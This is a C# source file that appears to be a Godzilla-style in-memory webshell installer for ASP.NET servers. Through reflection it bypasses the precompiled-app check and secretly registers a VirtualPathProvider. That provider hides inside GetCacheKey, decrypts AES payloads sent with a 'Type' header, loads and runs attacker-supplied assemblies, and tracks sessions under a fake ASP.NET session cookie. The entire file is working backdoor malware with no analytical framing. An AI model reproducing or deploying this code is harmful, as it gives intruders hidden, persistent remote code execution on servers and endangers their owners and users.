using System;
using System.Text;
using System.Threading;
using System.Web;
using System.Web.Caching;
using System.Web.Hosting;
using System.Runtime.Remoting;
using System.Security.Cryptography;
using System.Collections;
using System.Reflection;
using System.IO;
using System.Web.Compilation;

class G
{
	private string result = "";
	public G()
	{
		//Godzilla config
		string input_key = "key";
		string pass = "pass";

		try
		{
			string key = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(input_key))).Replace("-", "").ToLower().Substring(0, 16);
			PropertyInfo property = typeof(BuildManager).GetProperty("IsPrecompiledApp", BindingFlags.Instance | BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic | BindingFlags.GetProperty | BindingFlags.SetProperty);
			if (property != null)
			{
				if ((bool)property.GetValue(null, null))
				{
					Type typeFromHandle = typeof(BuildManager);
					FieldInfo field = typeFromHandle.GetField("_theBuildManager", BindingFlags.Static | BindingFlags.NonPublic);
					FieldInfo field2 = typeFromHandle.GetField("_isPrecompiledAppComputed", BindingFlags.Instance | BindingFlags.NonPublic);
					FieldInfo field3 = typeFromHandle.GetField("_isPrecompiledApp", BindingFlags.Instance | BindingFlags.NonPublic);
					object value = field.GetValue(null);
					field2.SetValue(value, true);
					field3.SetValue(value, false);
				}
				result += "BypassPrecompiledApp succesfully!<br/>";
			}
			else
			{
				result += "IsPrecompiledApp is false<br/>";
			}
			MemshellAdd add_shell = new MemshellAdd();
			//If needed
			//result += add_shell.bypassFriendlyUrlRoute();
			result += add_shell.AddShell(pass, key);

		}
		catch (Exception e)
		{
			result += "Exception caught: " + e.ToString();
		}
	}

	public string GetResult()
	{
		return this.result;
	}

	public class MemshellAdd
	{
		public string bypassFriendlyUrlRoute()
		{
			Type type = Assembly.GetAssembly(typeof(HttpContext)).GetType("System.Web.Routing.RouteTable");
			if (type == null)
			{
				return "Type System.Web.Routing.RouteTable could not be found";
			}
			PropertyInfo property = type.GetProperty("Routes");
			if (property == null)
			{
				return "MemberInfo System.Web.Routing.RouteTable.Routes could not be found";
			}
			object value = property.GetValue(null, null);
			if (value != null)
			{
				object obj = value.GetType().GetMethod("GetEnumerator").Invoke(value, null);
				MethodInfo method = obj.GetType().GetMethod("MoveNext");
				PropertyInfo property2 = obj.GetType().GetProperty("Current");
				while ((bool)method.Invoke(obj, null))
				{
					object value2 = property2.GetValue(obj, null);
					if (value2 != null && "Microsoft.AspNet.FriendlyUrls.FriendlyUrlRoute".Equals(value2.GetType().FullName))
					{
						PropertyInfo property3 = value2.GetType().GetProperty("Settings", BindingFlags.Instance | BindingFlags.Public);
						object obj2 = value2.GetType().Assembly.CreateInstance("Microsoft.AspNet.FriendlyUrls.FriendlyUrlSettings");
						obj2.GetType().GetProperty("AutoRedirectMode").SetValue(obj2, 2, null);
						property3.SetValue(value2, obj2, null);
					}
				}
				return "BypassFriendlyUrlRoute succesfully!<br/>";
			}
			return "Value System.Web.Routing.RouteTable.Routes could not be found<br/>";
		}

		public string AddShell(string password, string key)
		{
			MethodBase method = typeof(HostingEnvironment).GetMethod("RegisterVirtualPathProviderInternal", BindingFlags.Instance | BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.InvokeMethod);
			GodzillaVirtualPathProvider godzillaVirtualPathProvider = new GodzillaVirtualPathProvider();
			godzillaVirtualPathProvider.password = password;
			godzillaVirtualPathProvider.key = key;
			method.Invoke(null, new object[]
			{
					godzillaVirtualPathProvider
			});
			godzillaVirtualPathProvider.InitializeLifetimeService();
			return "Install succesfully!<br/>";
		}
	}


	public class GodzillaVirtualPathProvider : VirtualPathProvider
	{
		public string password = "pass";
		public string key = "3c6e0b8a9c15224a";

		public Hashtable sessions = new Hashtable();
		protected override void Initialize()
		{
			base.Initialize();
		}

		public bool alive = true;
		public GodzillaVirtualPathProvider()
		{
			new Thread(new ThreadStart(this.sessionGc)).Start();
		}

		public override string CombineVirtualPaths(string basePath, string relativePath)
		{
			return base.Previous.CombineVirtualPaths(basePath, relativePath);
		}

		public override ObjRef CreateObjRef(Type requestedType)
		{
			return base.Previous.CreateObjRef(requestedType);
		}

		public override bool DirectoryExists(string virtualDir)
		{
			return base.Previous.DirectoryExists(virtualDir);
		}

		public override bool Equals(object obj)
		{
			return base.Previous.Equals(obj);
		}

		public override bool FileExists(string virtualPath)
		{
			return base.Previous.FileExists(virtualPath);
		}

		public override CacheDependency GetCacheDependency(string virtualPath, IEnumerable virtualPathDependencies, DateTime utcStart)
		{
			return base.Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
		}

		public override string GetCacheKey(string virtualPath)
		{
			try
			{
				HttpContext.Current.Application.Contents.Count.ToString();
				HttpContext httpContext = HttpContext.Current;
				if (HttpContext.Current.Request.Headers.Get("Type") == "mem_b64")
				{
					if (HttpContext.Current.Request.ContentType.Contains("www-form") && httpContext.Request[this.password] != null)
					{
						string text = BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(this.password + this.key))).Replace("-", "");
						byte[] array = Convert.FromBase64String(httpContext.Request[this.password]);
						array = new RijndaelManaged().CreateDecryptor(Encoding.Default.GetBytes(this.key), Encoding.Default.GetBytes(this.key)).TransformFinalBlock(array, 0, array.Length);
						Hashtable hashtable = this.initSessionAndGet(httpContext.Request, httpContext.Response);
						if (hashtable == null)
						{
							throw new Exception("");
						}
						if (hashtable["payload"] == null)
						{
							hashtable["payload"] = (Assembly)typeof(Assembly).GetMethod("Load", new Type[]
							{
								typeof(byte[])
							}).Invoke(null, new object[]
							{
								array
							});
						}
						else
						{
							object obj = ((Assembly)hashtable["payload"]).CreateInstance("LY");
							MemoryStream memoryStream = new MemoryStream();
							obj.Equals(hashtable);
							obj.Equals(memoryStream);
							obj.Equals(httpContext);
							obj.Equals(array);
							obj.ToString();
							byte[] array2 = memoryStream.ToArray();
							memoryStream.Dispose();
							httpContext.Response.Write(text.Substring(0, 16));
							httpContext.Response.Write(Convert.ToBase64String(new RijndaelManaged().CreateEncryptor(Encoding.Default.GetBytes(this.key), Encoding.Default.GetBytes(this.key)).TransformFinalBlock(array2, 0, array2.Length)));
							httpContext.Response.Write(text.Substring(16));
						}
						HttpContext.Current.Response.End();

					}

				}
				else if (HttpContext.Current.Request.Headers.Get("Type") == "mem_raw")
				{
					int contentLength = int.Parse(httpContext.Request.Headers.Get("Content-Length"));
					byte[] array = new byte[contentLength];
					httpContext.Request.InputStream.Read(array, 0, contentLength);

					byte[] data = new RijndaelManaged().CreateDecryptor(Encoding.Default.GetBytes(this.key), Encoding.Default.GetBytes(this.key)).TransformFinalBlock(array, 0, array.Length);
					Hashtable hashtable = this.initSessionAndGet(httpContext.Request, httpContext.Response);
					if (hashtable == null)
					{
						throw new Exception("");
					}
					if (hashtable["payload"] == null)
					{
						hashtable["payload"] = (Assembly)typeof(Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });
					}
					else
					{
						object o = ((Assembly)hashtable["payload"]).CreateInstance("LY");
						MemoryStream outStream = new MemoryStream();
						o.Equals(hashtable);
						o.Equals(outStream);
						o.Equals(httpContext);
						o.Equals(data);
						o.ToString();
						byte[] r = outStream.ToArray();
						outStream.Dispose();
						if (r.Length > 0)
						{
							r = new RijndaelManaged().CreateEncryptor(Encoding.Default.GetBytes(key), Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);
							httpContext.Response.BinaryWrite(r);
						}
					}
					HttpContext.Current.Response.Flush();
					HttpContext.Current.Response.End();
				}
				else if (HttpContext.Current.Request.Headers.Get("Type") == "print")
				{
					httpContext.Response.Write("OK");
					HttpContext.Current.Response.Flush();
					HttpContext.Current.Response.End();
				}


			}
			catch (Exception)
			{
			}
			return base.Previous.GetCacheKey(virtualPath);
		}

		private void sessionGc()
		{
			try
			{
				while (this.alive)
				{
					long num = GodzillaVirtualPathProvider.currentTimestamp();
					Thread.Sleep(300000);
					num += 10000L;
					IEnumerator enumerator = this.sessions.Keys.GetEnumerator();
					ArrayList arrayList = new ArrayList();
					while (enumerator.MoveNext())
					{
						object obj = enumerator.Current;
						string value = obj as string;
						Hashtable hashtable = this.sessions[value] as Hashtable;
						try
						{
							if (hashtable.Count == 0 || (long)hashtable["lastTime"] < num)
							{
								arrayList.Add(value);
							}
						}
						catch (Exception)
						{
							arrayList.Add(value);
						}
					}
					foreach (object obj2 in arrayList)
					{
						this.sessions.Remove(obj2);
					}
				}
			}
			catch (Exception)
			{
			}
		}

		private Hashtable initSessionAndGet(HttpRequest request, HttpResponse response)
		{
			string name = "ASP.NET__SessionId";
			Guid sessionId = Guid.NewGuid();
			HttpCookie httpCookie = request.Cookies.Get(name);
			if (httpCookie == null)
			{
				httpCookie = new HttpCookie(name, sessionId.ToString());
				response.SetCookie(httpCookie);
				Hashtable hashtable = new Hashtable();
				hashtable.Add("lastTime", GodzillaVirtualPathProvider.currentTimestamp());
				this.sessions.Add(httpCookie.Value, hashtable);
				return hashtable;
			}
			if (this.sessions.ContainsKey(httpCookie.Value))
			{
				Hashtable hashtable2 = this.sessions[httpCookie.Value] as Hashtable;
				hashtable2["lastTime"] = GodzillaVirtualPathProvider.currentTimestamp();
				return hashtable2;
			}
			return null;
		}

		private static long currentTimestamp()
		{
			return (DateTime.Now.ToUniversalTime().Ticks - 621355968000000000L) / 10000L;
		}

		public override VirtualDirectory GetDirectory(string virtualDir)
		{
			return base.Previous.GetDirectory(virtualDir);
		}

		public override VirtualFile GetFile(string virtualPath)
		{
			return base.Previous.GetFile(virtualPath);
		}

		public override string GetFileHash(string virtualPath, IEnumerable virtualPathDependencies)
		{
			return base.Previous.GetFileHash(virtualPath, virtualPathDependencies);
		}

		public override int GetHashCode()
		{
			return base.Previous.GetHashCode();
		}

		public override object InitializeLifetimeService()
		{
			return base.Previous.InitializeLifetimeService();
		}

		public override string ToString()
		{
			return base.Previous.ToString();
		}


	}
	
}
